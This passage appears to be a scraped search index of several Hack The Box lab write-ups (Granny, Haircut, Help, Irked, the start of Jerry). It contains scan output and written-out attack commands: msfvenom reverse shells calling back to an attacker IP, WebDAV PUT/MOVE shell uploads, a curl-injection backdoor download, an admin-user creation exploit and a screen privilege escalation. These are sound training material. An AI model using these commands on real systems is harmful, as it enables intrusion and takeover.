[http://10.10.10.15:80/_vti_bin/shtml.dll](http://10.10.10.15:80/_vti_bin/shtml.dll) (Status: 200) [Size: 96] [http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll](http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll) (Status: 200) [Size: 195] [http://10.10.10.15:80/_vti_inf.html](http://10.10.10.15:80/_vti_inf.html) (Status: 200) [Size: 1754] [http://10.10.10.15:80/_vti_log](http://10.10.10.15:80/_vti_log) (Status: 301) [Size: 158] [http://10.10.10.15:80/aspnet_client](http://10.10.10.15:80/aspnet_client) (Status: 301) [Size: 161] [http://10.10.10.15:80/images](http://10.10.10.15:80/images) (Status: 301) [Size: 152] [http://10.10.10.15:80/Images](http://10.10.10.15:80/Images) (Status: 301) [Size: 152] [http://10.10.10.15:80/postinfo.html](http://10.10.10.15:80/postinfo.html) (Status: 200) [Size: 2440] =============================================================== 2020/02/16 23:26:16 Finished =============================================================== Finished gobuster scan ========================= Starting nikto scan - Nikto v2.1.6 -------------------------------------------------------------------- + Target IP: 10.10.10.15 + Target Hostname: 10.10.10.15 + Target Port: 80 + Start Time: 2020-02-16 23:26:18 (GMT-5) -------------------------------------------------------------------- + Server: Microsoft-IIS/6.0 + Retrieved microsoftofficewebserver header: 5.0_Pub + Retrieved x-powered-by header: ASP.NET + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + Uncommon header microsoftofficewebserver found, with contents: 5.0_Pub + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Retrieved x-aspnet-version header: 1.1.4322 + No CGI Directories found (use -C all to force check all possible dirs) + OSVDB-397: HTTP method PUT allows clients to save files on the web server. + OSVDB-5646: HTTP method DELETE allows clients to delete files on the web server. + Retrieved dasl header: DAV:sql + Retrieved dav header: 1, 2 + Retrieved ms-author-via header: MS-FP/4.0,DAV + Uncommon header ms-author-via found, with contents: MS-FP/4.0,DAV + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ( Allow Header): DELETE may allow clients to remove files on the web server. + OSVDB-397: HTTP method ( Allow Header): PUT method could allow clients to save files on the web server. + OSVDB-5647: HTTP method ( Allow Header): MOVE may allow clients to change file locations on the web server. + Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ( Public Header): DELETE may allow clients to remove files on the web server. + OSVDB-397: HTTP method ( Public Header): PUT method could allow clients to save files on the web server. + OSVDB-5647: HTTP method ( Public Header): MOVE may allow clients to change file locations on the web server. + WebDAV enabled (UNLOCK PROPFIND COPY MKCOL SEARCH LOCK PROPPATCH listed as allowed) + OSVDB-13431: PROPFIND HTTP verb may show the server s internal IP address: [http://granny/_vti_bin/_vti_aut/author.dll](http://granny/_vti_bin/_vti_aut/author.dll) + OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted. + OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found. + OSVDB-3233: /_private/: FrontPage directory found. + OSVDB-3233: /_vti_bin/: FrontPage directory found. + OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information). + OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted). + OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376). [http://www.securityfocus.com/bid/2252](http://www.securityfocus.com/bid/2252). + OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST. + /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found. + 8018 requests: 0 error(s) and 32 item(s) reported on remote host + End Time: 2020-02-16 23:32:39 (GMT-5) (381 seconds) -------------------------------------------------------------------- + 1 host(s) tested Finished nikto scan ========================= \u200b \u200b ---------------------Finished all Nmap scans--------------------- Completed in 16 minute(s) and 19 second(s) We have one port open. Port 80: running Microsoft IIS httpd 6.0 Before we move on to enumeration, let\u2019s make some mental notes about the scan results. The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft-IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server.","title":"Reconnaissance"},{"location":"Retired/Granny Writeup/#enumeration","text":"Visit the web application in the browser. Look into the directories/files that gobuster found. We don\u2019t find anything useful. Next, let\u2019s test the allowed HTTP methods. The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is a Microsoft IIS web server, the type of files it executes are ASP and ASPX. So let\u2019s check if we\u2019re allowed to upload these file extensions. davtest --url [http://10.10.10.15](http://10.10.10.15) We get back the following result. Both ASP and ASPX are not allowed. However, TXT and HTML files are. Remember that the PUT HTTP method was not the only method that was allowed. We also can use the MOVE method. The MOVE method not only can be used to change file locations on the web server, but it can also be used to rename files. Let\u2019s try to upload an HTML file on the web server and then rename it to change the extension to an ASPX file. root@kali:~/Desktop/htb/granny# curl -X PUT [http://10.10.10.15/test.html](http://10.10.10.15/test.html) -d [@test](http://twitter.com/test).html \u200b root@kali:~/Desktop/htb/granny# curl http://10.10.10.15/test.html","title":"Enumeration"},{"location":"Retired/Granny Writeup/#initial-foothold","text":"Generate an ASPX reverse shell using msfvenom. msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx -p : payload -f : format LHOST : attack machine\u2019s (kali) IP address LPORT : the port you want to send the reverse shell to -o : where to save the payload Rename the file to shell.txt so that we can upload it on the server. mv shell.aspx shell.txt Then upload the file on the web server and change the file extension to ASPX. curl -X PUT [http://10.10.10.15/shell.txt](http://10.10.10.15/shell.txt) --data-binary [@shell](http://twitter.com/shell).txt curl -X MOVE --header Destination:[http://10.10.10.15/shell.aspx ](http://10.10.10.15.shell.aspx ) [http://10.10.10.15/shell.txt ](http://10.10.10.15/shell.txt ) Next, set up a listener on your attack machine. nc -nlvp 1234 Execute the shell.aspx file (either through the browser or the curl command) to send a shell back to our attack machine. We get a shell! Unfortunately, we don\u2019t have permission to view the user.txt flag, so we need to escalate privileges. Note : This shell is unstable and seems to crash every minute or so. So the next couple of steps will have to be done in several sessions. If you don\u2019t want to go through this torture, skip to the Extra Content section that solves the box using Metasploit.","title":"Initial Foothold"},{"location":"Retired/Granny Writeup/#privilege-escalation","text":"We\u2019ll use Windows Exploit Suggester to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges. First, download the script. git clone [https://github.com/GDSSecurity/Windows-Exploit-Suggester.git](https://github.com/GDSSecurity/Windows-Exploit-Suggester.git) Next, install the dependencies specified in the readme document. pip install xlrd --upgrade Update the database. ./windows-exploit-suggester.py --update This creates an excel spreadsheet from the Microsoft vulnerability database in the working directory. The next step is to retrieve the system information from the target machine. This can be done using the \u201c systeminfo \u201d command. Copy the output and save it in the file \u201c systeminfo.txt \u201d on the attack machine. Then run the following command. ./windows-exploit-suggester.py --database 2020-02-17-mssb.xls --systeminfo ../../htb/granny/systeminfo.txt It outputs many vulnerabilities. I tried several of them, but none of them worked except for the Microsoft Windows Server 2003 \u2014 Token Kidnapping Local Privilege Escalation exploit. Grab the executable from here and transfer it to the attack machine in the same way we transferred the reverse shell. Whatever command we include when running the executable file, the command will get executed with escalated privileges. Let\u2019s use the executable to add a user on the system that is part of the Administrators group. churrasco.exe net user test test /add net localgroup Administrators test /add The command completes successfully. However, when I try to use the \u201c runas \u201d command to switch to that user it doesn\u2019t work. Maybe User Account Control (UAC) is enabled and the \u201c runas \u201d command does not elevate your privileges. So I figured maybe I could get it working using PowerShell as explained in this article , but PowerShell is not installed on the machine! So all you can do is use the exploit to view the user.txt and root.txt flags. I however, like to get a privileged shell on each box I solve and so I\u2019m going to use Metasploit to get a shell on this box.","title":"Privilege Escalation"},{"location":"Retired/Granny Writeup/#extra-content-metasploit-solution","text":"I\u2019m going to skim through this part since there are a ton of write ups out there that show how to solve this box using Metasploit. First, create an ASPX meterpreter reverse shell. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8888 -f aspx met-shell.aspx Then upload the shell payload in the same way we did before. root@kali:~/Desktop/htb/granny# cp met-shell.aspx met-shell.txt root@kali:~/Desktop/htb/granny# curl -X PUT [http://10.10.10.15/met-shell.txt](http://10.10.10.15/met-shell.txt) --data-binary [@met](http://twitter.com/met)-shell.txt root@kali:~/Desktop/htb/granny# curl -X MOVE -H Destination: [http://10.10.10.15/met-shell.aspx ](http://10.10.10.15/met-shell.aspx ) [http://10.10.10.15/met-shell.txt](http://10.10.10.15/met-shell.txt) Configure metasploit to receive the reverse shell. use exploit/multi/handler set lhost tun0 set lport 8888 Confirm that the configuration was set properly using the \u201c options \u201d command. Then use the \u201c run \u201d command to start the reverse tcp handler. In the browser, execute the met-shell.aspx payload and wait for a session to open up in Metasploit. Perfect! Next, use the local exploit suggester module to see which exploits the system is vulnerable to. We\u2019ll go with the second one MS14\u2013058. use exploit/windows/local/ms14_058_track_popup_menu set session 1 run It opens up another session. Let\u2019s see what privilege we\u2019re running with. meterpreter getuid Server username: NT AUTHORITY\\SYSTEM We\u2019re system! Grab the user.txt flag. Grab the root.txt flag.","title":"Extra Content: Metasploit Solution"},{"location":"Retired/Granny Writeup/#lessons-learned","text":"To gain an initial foothold on the box we exploited one vulnerability. Insecure configuration of the web server that allowed us to upload arbitrary files using the HTTP methods \u2018PUT\u2019 and \u2018MOVE\u2019. This would have been avoided if these methods were disabled. To escalate privileges we exploited one vulnerability. Kernel vulnerability in the outdated operating system that was being used. This could have been avoided if the OS was patched.","title":"Lessons Learned"},{"location":"Retired/Granny Writeup/#conclusion","text":"34 machines down, 12 more to go!","title":"Conclusion"},{"location":"Retired/Haircut Writeup/","text":"Level: Intermediate Task: find user.txt and root.txt file on the victim\u2019s machine. Since these labs are online accessible therefore they have static IP. The IP of Haircut is 10.10.10.24 so let\u2019s initiate with nmap port enumeration. From the given below image, you can observe we found port 22 and 80 are open in the victim\u2019s network. Knowing port 80 is open to the victim\u2019s network we preferred to explore his IP in a browser and the following image as shown below. Then I preferred to use dirbuster tool and chose directory list 2-3 medium.txt file for directory brute force attack on http://10.10.10.24 for PHP file extension. As a result, it found the uploads directory with 403 response and an exposed.php file with 200 ok response. When we explored http://10.10.10.24/exposed.php we found a search page for finding the location of any hairdresser\u2019s. For testing, I search for google.com and received very uncommon result but when I inspect the following code I notice the word \u201c CURL \u201d which might be pointing towards running curl service in targets system. As we known curl have upload or download option and hence here we can transfer our backdoor to targets system. Without wasting time I generated a PHP backdoor with help of msfvenom and start multi/handler inside the Metasploit framework. msfvenom -p php/meterpreter/reverse_tcp lhost\\=10.10.14.3 lport\\=4321 -f raw Now we need to transfer our backdoor file to the target system therefore first we need to run python server on port 80 using the following command. python -m SimpleHTTPServer 80 First I tried to upload the file directly through browser http://10.10.10.24/exposed.php but got failed at that point I use burpsuite for fetching HTTP post request and send it to the repeater . Then I run curl command for downloading any file from the given path by omitting word \u201ccurl\u201d as shown below. formurl \\= -o uploads/revshell.php http://10.10.14.3/revshell.php uploads/revshell.php denotes the path where our backdoor reverse.php file will be uploaded. http://10.10.14.3/revshell.php denotes the path for downloading the file from here. After then click on the Go tab and found that our file is successfully transferred into the target\u2019s system. As the revshell.php file is successfully transferred into the target\u2019s system but we need to execute that file for getting the reverse connection, therefore, I simply run following the path in a web browser. http://10.10.10.24/uploads/revshell.php After executing uploaded backdoor file come back to the Metasploit framework and wait for the meterpreter session. msf use exploit/multi/handler msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp msf exploit(multi/handler) set lhost 10.10.14.3 msf exploit(multi/handler) set lport 4321 msf exploit(multi/handler) exploit From given below image you can observe meterpreter session 1 opened for accessing victim tty shell. Now let\u2019s finished the task by grabbing user.txt and root.txt file. First I move into the home directory and check available files and directories inside it. here I got a directory maria and after exploring it we found so many files and directory, at last, I fetch the user.txt file from inside / maria/Desktop/ and use cat command for reading. our 1st challenges finished successfully now move for 2nd challenge. For spawning proper tty shell of target\u2019s system we need to import python file, therefore, I run following command inside the meterpreter shell python -c 'import pty;pty.spawn(\"/bin/bash\")' Then using the following command we got all files and directories having root permission. find / -perm -4000 -user root -exec ls -ld {} \\; 2>/dev/null Here I notice /usr/bin/screen-4.5.0 now let\u2019s check its exploit if available. In a new terminal, we look for any exploit present in exploitdb for screen 4.5.0 with help of searchsploit. searchsploit screen 4.5.0 From given below image you can observe the highlighted exploit 41154.sh which is a shell script for local privilege escalation. When I didn\u2019t find any appropriate method to execute this shell script for post exploitation then I go with manual compilation and review its code using cat command. cat /usr/share/exploitdb/exploits/linux/local/41154.sh If you will notice the following code then you will observe this script is written in C language and we have divided it into three part for manual compilation. Copy Yellow highlighted the code and past it in a text document and save it as libhax.c Copy Orang e highlighted the code and past it in a text document and save it as rootshell . c At last copy remaining code and past it in a text document and save it as 41154.sh From given below image you can see I have pasted above copied inside rootshell.c From given below image you can see I have pasted above copied inside libhax.c From given below image you can see I have pasted above remaining copied inside 41154.sh and save all three text document on the desktop in a new folder shell . Let\u2019s compile our C program file manually in our local system using gcc as given below. gcc -fPIC -shared -ldl -o libhax.so libhax.c Similarly compile rootshell.c file through the following command. gcc -o rootshell rootshell.c From given below image you can see all files we have stored in our folder shell, now let\u2019s upload them into the target\u2019s system through our previous meterpreter session. Since we /tmp has read and write permission, therefore, we are uploading all files in /tmp directory by executing following command. cd /tmp upload /root/Desktop/shell . Again for spawning proper tty shell of target\u2019s system, we need to import python file, therefore, I run following command inside the meterpreter shell python -c 'import pty;pty.spawn(\"/bin/bash\")' Open 41154.sh file as it contains a command for getting root privilege as shown below. Execute the following command and get the root. cd /etc unmask 000 -D -m -L ld.so.preload echo -ne \"\\x0a/tmp/libhax.so\" cd root Here I got root.txt file now using cat command let open this file and finished our 2nd challenge. Wonderful!! We had completed the task and hacked this box. Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here s","title":"32. Haircut Writeup.md"},{"location":"Retired/Help Writeup/","text":"Let\u2019s jump in. Enumeration and Recon As always, let's start with an Nmap scan Looking at the results, We see that ports 22, 80 and 3000 are open Port 22 \u2014 OpenSSH 80 \u2014 Apache Server 3000 \u2014 Node.js Express framework ( looks interesting ) Looking at the 80 port, we see that its a default page of Apache2 server. Running gobuster on port 80, comes up with an interesting directory Lets check what we\u2019ve got at http://10.10.10.121/support . Its a HelpDeskZ application, a quick google search says HelpDeskZ is a free PHP based software which allows you to manage your site\u2019s support with a web-based support ticket system. We have a login option and an option to submit a ticket. Let's try to submit a ticket. Page says php file is not allowed ( filter bypass may be ). One more crucial point here is to find the location to where the files are uploaded to. Let's have a look at the code as its an open-source application. https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php evolutionscript/HelpDeskZ-1.0 HelpDeskZ v1.0. Contribute to evolutionscript/HelpDeskZ-1.0 development by creating an account on GitHub. Looking at the code, we see that an md5 in run on the uploaded filename with the time() function** **appended to it. And although, we see an error message saying file type is not allowed. But its actually getting uploaded and what we see in just an error message after uploading. ( Nice!!! ) But the Server is in another timezone (GMT). So I had to convert the server response time to epoch as, PHP time() function returns the current time measured in the number of seconds since the Unix Epoch. What I did here was just checked the response header from network tab after clicking submit button in the browser( too lazy to intercept the request in Burp ). There it is,. 07 Jun 2019 05:52:14 GMT is the server response time. It\u2019s corresponding epoch is 1559886734. I did the conversion using https://www.epochconverter.com/ Awesome. We got the timestamp and the upload directory. Forgot to mention, I have uploaded a phpshell and yes, let's get our shell. Here \u201c phpshell.php \u201d is our filename and appended to it is the server response time in Epoch. Our file is uploaded to http:// /uploads/tickets/ . To grab you shell don\u2019t forget to start your listener.Browsing to the URL http://10.10.10.121/support/uploads/tickets/04215397f1a751cf60d7e42fc06a6767.php Banggg!! Got shell. Privilege Escalation Looking at the directories manually, I couldn\u2019t find anything of great interest. Also running [**procmon.sh ( Ippsec Process Monitoring script )]**(https://gist.github.com/jsvazic/8fe9dde369f6396f65a1aa795dd77744) went in vain. As usual, I ran LinEnum and didn\u2019t see anything fishy there too. But, the kernel was old. I didn\u2019t consider the option of using kernel exploit as more often than not it is not the intended way to privesc . But here kernel exploit was the intended way. I went forward with kernel exploit. Have a look at the kernel version below. A quick google search , showed a privilege escalation exploit. Let's run the exploit there and get root shell. Rooted and done. Go get your flags if you haven\u2019t still. Additional Port 3000 \u2014 Node.js Express Framework Checking the 3000 port, we are greeted with a JSON response. Well, maybe we got a potential username ( Shiv ) . Lets put it in our back pocket and enumerate more. Page says, we have to get the creds with a given query. Friend of mine told me that its using GRAPHQL , an alternative to REST . And the endpoint in GraphQL is /graphql And the URL is http:// /graphql?query={query} After a lot of trial and error. I managed to get the correct query. **http://10.10.10.121:3000/graphql?query={user{username,password }} Use these creds( after cracking the hash, of course ) to login to HelpDeskz application and rest everything is same. There are exploits for the same in the wild, they need some editing though, I will leave them up to you to try them out.","title":"11. Help Writeup.md"},{"location":"Retired/Help Writeup/#lets-jump-in","text":"","title":"Let\u2019s jump in."},{"location":"Retired/Help Writeup/#enumeration-and-recon","text":"As always, let's start with an Nmap scan Looking at the results, We see that ports 22, 80 and 3000 are open Port 22 \u2014 OpenSSH 80 \u2014 Apache Server 3000 \u2014 Node.js Express framework ( looks interesting ) Looking at the 80 port, we see that its a default page of Apache2 server. Running gobuster on port 80, comes up with an interesting directory Lets check what we\u2019ve got at http://10.10.10.121/support . Its a HelpDeskZ application, a quick google search says HelpDeskZ is a free PHP based software which allows you to manage your site\u2019s support with a web-based support ticket system. We have a login option and an option to submit a ticket. Let's try to submit a ticket. Page says php file is not allowed ( filter bypass may be ). One more crucial point here is to find the location to where the files are uploaded to. Let's have a look at the code as its an open-source application. https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php evolutionscript/HelpDeskZ-1.0 HelpDeskZ v1.0. Contribute to evolutionscript/HelpDeskZ-1.0 development by creating an account on GitHub. Looking at the code, we see that an md5 in run on the uploaded filename with the time() function** **appended to it. And although, we see an error message saying file type is not allowed. But its actually getting uploaded and what we see in just an error message after uploading. ( Nice!!! ) But the Server is in another timezone (GMT). So I had to convert the server response time to epoch as, PHP time() function returns the current time measured in the number of seconds since the Unix Epoch. What I did here was just checked the response header from network tab after clicking submit button in the browser( too lazy to intercept the request in Burp ). There it is,. 07 Jun 2019 05:52:14 GMT is the server response time. It\u2019s corresponding epoch is 1559886734. I did the conversion using https://www.epochconverter.com/ Awesome. We got the timestamp and the upload directory. Forgot to mention, I have uploaded a phpshell and yes, let's get our shell. Here \u201c phpshell.php \u201d is our filename and appended to it is the server response time in Epoch. Our file is uploaded to http:// /uploads/tickets/ . To grab you shell don\u2019t forget to start your listener.Browsing to the URL http://10.10.10.121/support/uploads/tickets/04215397f1a751cf60d7e42fc06a6767.php Banggg!! Got shell.","title":"Enumeration and Recon"},{"location":"Retired/Help Writeup/#privilege-escalation","text":"Looking at the directories manually, I couldn\u2019t find anything of great interest. Also running [**procmon.sh ( Ippsec Process Monitoring script )]**(https://gist.github.com/jsvazic/8fe9dde369f6396f65a1aa795dd77744) went in vain. As usual, I ran LinEnum and didn\u2019t see anything fishy there too. But, the kernel was old. I didn\u2019t consider the option of using kernel exploit as more often than not it is not the intended way to privesc . But here kernel exploit was the intended way. I went forward with kernel exploit. Have a look at the kernel version below. A quick google search , showed a privilege escalation exploit. Let's run the exploit there and get root shell. Rooted and done. Go get your flags if you haven\u2019t still.","title":"Privilege Escalation"},{"location":"Retired/Help Writeup/#additional","text":"","title":"Additional"},{"location":"Retired/Help Writeup/#port-3000-nodejs-express-framework","text":"Checking the 3000 port, we are greeted with a JSON response. Well, maybe we got a potential username ( Shiv ) . Lets put it in our back pocket and enumerate more. Page says, we have to get the creds with a given query. Friend of mine told me that its using GRAPHQL , an alternative to REST . And the endpoint in GraphQL is /graphql","title":"Port 3000 \u2014 Node.js Express Framework"},{"location":"Retired/Help Writeup/#and-the-url-is-httpgraphqlqueryquery","text":"After a lot of trial and error. I managed to get the correct query. **http://10.10.10.121:3000/graphql?query={user{username,password }} Use these creds( after cracking the hash, of course ) to login to HelpDeskz application and rest everything is same. There are exploits for the same in the wild, they need some editing though, I will leave them up to you to try them out.","title":"And the URL is http:///graphql?query={query}"},{"location":"Retired/Irked Writeup/","text":"Summary Irked is a Linux host running an UnrealIRCD service that is vulnerable to Command Execution due to a malicious backdoor that was added to the Unreal IRCD version 3.2.8.1. This was leveraged to access files on the system in order to enumerate users, read files, and retrieve the user.txt file. The root access was gained by executing a file called viewuser that gives root permission to a user to retrieve the root.txt file. Reconnaissance I immediately fired up NMAP to retrieve the list of services running on the machine. fsociety:~ aj$ nmap -sV -sC -p- -T4 10.10.10.117 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-01 23:08 PST Nmap scan report for 10.10.10.117 Host is up (0.20s latency). Not shown: 65364 closed ports, 165 filtered ports PORT STATE SERVICE VERSION **22**/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) **80**/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn t have a title (text/html). **111**/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 39726/udp status |_ 100024 1 49785/tcp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 65534/tcp open irc UnrealIRCd Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Nmap done: 1 IP address (1 host up) scanned in 1583.20 seconds The NMAP result returned 4 services which are http , ssh , rpc , and irc . Visiting http://10.10.10.117 / will return the page below. Executing dirsearch to look for directories and files returns Apache HTTP Server Documentation only. Next step that I did was to search on Google for OpenSSH 6.7p1 Debian 5+deb8u4 exploit and rpcbind 2\u20134 RCE exploit but I got nothing. Exploitation The last service is UnrealIRCd , an IRC server deployed on this machine. I searched for an exploit on Google and learned that it was vulnerable to UnrealIRCD 3.2.8.1 Backdoor Command Execution . I fired up Metasploit and used exploit/unix/irc/unreal_ircd_3281_backdoor module to exploit the machine. After I successfully exploited the machine, I immediately typed whoami command to check the user I\u2019m currently using and executed cat /etc/passwd command to check the list of other users. From there, I learned that there was a user named djmardov . So, I executed ls -ahlR /home/djmardov/* to find anything interesting in djmardov\u2019s home directory and I found these files shown in the picture below inside Documents folder. It clearly shows that we cannot access the file named user.txt but we can definitely read the .backup file. fsociety:~ aj$ cat /home/djmardov/Documents/.backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss The .backup file contains a password(pw) and it mentions \u201csteg\u201d. I already guessed that there was some kind of steganography challenge on this machine. Then, I remembered that there was an image in the http://10.10.10.117/. I downloaded the image named irked.jpg. Using steghide, I extracted a hidden file named pass.txt from the image. Opening the file will give us the password. fsociety:~ aj$ cat pass.txt Kab6h+m+bbp2J:HG Now that I have recovered the password, I decided to use it in SSH with username as djmardov then** **I read the content of the user.txt file. Next step is to root the machine. To do this, I executed the following command to find an executable file that can be run by djmardov. find / -perm -u=s -type f 2 /dev/null And here is the result. After running some of those binaries shown in the picture above, I ended up with /usr/bin/viewuser that gives me a root access in the machine. A message saying that a file named listusers in /tmp/ folder was not found after running viewuser . So what I did was to create the missing file with su root as content and executed viewuser again, but this time, I got Permission denied message. But by simply changing the permission of the file and running it, I successfully got root access on the machine. I executed find command to look for root.txt and get the hash inside the file.","title":"33. Irked Writeup.md"},{"location":"Retired/Irked Writeup/#summary","text":"Irked is a Linux host running an UnrealIRCD service that is vulnerable to Command Execution due to a malicious backdoor that was added to the Unreal IRCD version 3.2.8.1. This was leveraged to access files on the system in order to enumerate users, read files, and retrieve the user.txt file. The root access was gained by executing a file called viewuser that gives root permission to a user to retrieve the root.txt file.","title":"Summary"},{"location":"Retired/Irked Writeup/#reconnaissance","text":"I immediately fired up NMAP to retrieve the list of services running on the machine. fsociety:~ aj$ nmap -sV -sC -p- -T4 10.10.10.117 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-01 23:08 PST Nmap scan report for 10.10.10.117 Host is up (0.20s latency). Not shown: 65364 closed ports, 165 filtered ports PORT STATE SERVICE VERSION **22**/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) **80**/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn t have a title (text/html). **111**/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 39726/udp status |_ 100024 1 49785/tcp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 65534/tcp open irc UnrealIRCd Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Nmap done: 1 IP address (1 host up) scanned in 1583.20 seconds The NMAP result returned 4 services which are http , ssh , rpc , and irc . Visiting http://10.10.10.117 / will return the page below. Executing dirsearch to look for directories and files returns Apache HTTP Server Documentation only. Next step that I did was to search on Google for OpenSSH 6.7p1 Debian 5+deb8u4 exploit and rpcbind 2\u20134 RCE exploit but I got nothing.","title":"Reconnaissance"},{"location":"Retired/Irked Writeup/#exploitation","text":"The last service is UnrealIRCd , an IRC server deployed on this machine. I searched for an exploit on Google and learned that it was vulnerable to UnrealIRCD 3.2.8.1 Backdoor Command Execution . I fired up Metasploit and used exploit/unix/irc/unreal_ircd_3281_backdoor module to exploit the machine. After I successfully exploited the machine, I immediately typed whoami command to check the user I\u2019m currently using and executed cat /etc/passwd command to check the list of other users. From there, I learned that there was a user named djmardov . So, I executed ls -ahlR /home/djmardov/* to find anything interesting in djmardov\u2019s home directory and I found these files shown in the picture below inside Documents folder. It clearly shows that we cannot access the file named user.txt but we can definitely read the .backup file. fsociety:~ aj$ cat /home/djmardov/Documents/.backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss The .backup file contains a password(pw) and it mentions \u201csteg\u201d. I already guessed that there was some kind of steganography challenge on this machine. Then, I remembered that there was an image in the http://10.10.10.117/. I downloaded the image named irked.jpg. Using steghide, I extracted a hidden file named pass.txt from the image. Opening the file will give us the password. fsociety:~ aj$ cat pass.txt Kab6h+m+bbp2J:HG Now that I have recovered the password, I decided to use it in SSH with username as djmardov then** **I read the content of the user.txt file. Next step is to root the machine. To do this, I executed the following command to find an executable file that can be run by djmardov. find / -perm -u=s -type f 2 /dev/null And here is the result. After running some of those binaries shown in the picture above, I ended up with /usr/bin/viewuser that gives me a root access in the machine. A message saying that a file named listusers in /tmp/ folder was not found after running viewuser . So what I did was to create the missing file with su root as content and executed viewuser again, but this time, I got Permission denied message. But by simply changing the permission of the file and running it, I successfully got root access on the machine. I executed find command to look for root.txt and get the hash inside the file.","title":"Exploitation"},{"location":"Retired/Jerry Writeup/","text":"Hack The Box \u2014 Jerry Write-up This is my write-up for the \u2018Jerry\u2019 box found on Hack The Box . In short: Default credentials and authenticated RCE using metasploit module, Apache was running as root so no privilege escalation required. Part 1: User The information we start with is that it\u2019s IP is 10.10.10.95, and it runs Windows. Of course, this is hardly enough information! So we use nmap to see what this machine has to offer. We see that it\u2019s running Apache Tomcat on port 8080, so our first instinct would be to visit the page. Manager App sounds interesting! Looks like we need login information, or we could just try \u2018admin\u2019 and \u2018admin\u2019? Well, something happened. If we have a read of this, we can see it\u2019s showing us how to set up an account that can access the Manager App, with the username \u2018tomcat\u2019 and the password \u2018s3cret\u2019. So we tried \u2018admin\u2019 and \u2018admin\u2019, it didn\u2019t work, but we are presented with new login credentials now, so let\u2019s try them! However we\u2019re already logged in, so I quickly close Firefox and open it again, this will wipe the cookies as we\u2019re in Private Browsing mode, thus logging us out. We then log back in with the new credentials and\u2026 This looks promising! Let\u2019s have a gander at what we can do. Some of these names don\u2019t look standard, indicating that this may be our way to getting user access. Scrolling further down, we see the reason for the strangely named apps. There\u2019s an option to upload a WAR file, which is basically a JAR file for web apps. This sounds like our vulnerability to me, so we go to our best friend Google. After chucking some random words together, we come across an exploit that makes use of authenticated upload, so the next step is to load up msfconsole Side note: The module I\u2019m using is 